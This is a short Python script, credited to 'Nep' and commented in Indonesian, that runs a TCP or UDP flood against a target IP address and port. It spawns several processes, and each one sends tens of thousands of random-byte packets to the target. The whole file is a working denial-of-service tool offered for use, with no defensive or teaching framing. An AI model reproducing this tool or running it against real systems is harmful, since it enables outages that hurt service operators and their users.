import argparse
import logging
import multiprocessing
import random
import ipaddress
import socket

# Konfigurasi logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("__main__")


# Fungsi untuk melakukan serangan UDP flood
def udp_flood(ip, port, times):
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        addr = (ip, int(port))
        for x in range(times):
            s.sendto(data, addr)
        logger.info(f"Sent to {ip}:{port} - UDP Flood")
    except Exception as e:
        logger.error(f"Error in UDP flood: {str(e)}")


# Fungsi untuk melakukan serangan TCP flood
def tcp_flood(ip, port, times):
    data = random._urandom(16)
    i = random.choice(("[*]", "[!]", "[#]"))
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        for x in range(times):
            s.send(data)
        logger.info(f"Sent to {ip}:{port} - TCP Flood")
    except Exception as e:
        logger.error(f"Error in TCP flood: {str(e)}")


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("-p", "--port", required=True, type=int, help="Port")
    ap.add_argument("-i", "--ip", required=True, type=str, help="Target IP Address")
    ap.add_argument(
        "-c", "--choice", type=str, default="y", choices=["y", "n"], help="UDP(y/n)"
    )
    ap.add_argument(
        "-t", "--times", type=int, default=50000, help="Packets per one connection"
    )
    ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
    args = vars(ap.parse_args())

    logging.info("--> Code by Nep <--")
    logging.info("#-- TCP/UDP FLOOD --#")
    port = args["port"]
    target_ip = args["ip"]
    choice = args["choice"]
    times = args["times"]
    threads = args["threads"]

    processes = []
    for y in range(threads):
        if choice == "y":
            process = multiprocessing.Process(
                target=udp_flood, args=(target_ip, port, times)
            )
        else:
            process = multiprocessing.Process(
                target=tcp_flood, args=(target_ip, port, times)
            )
        processes.append(process)
        process.start()

    for process in processes:
        process.join()
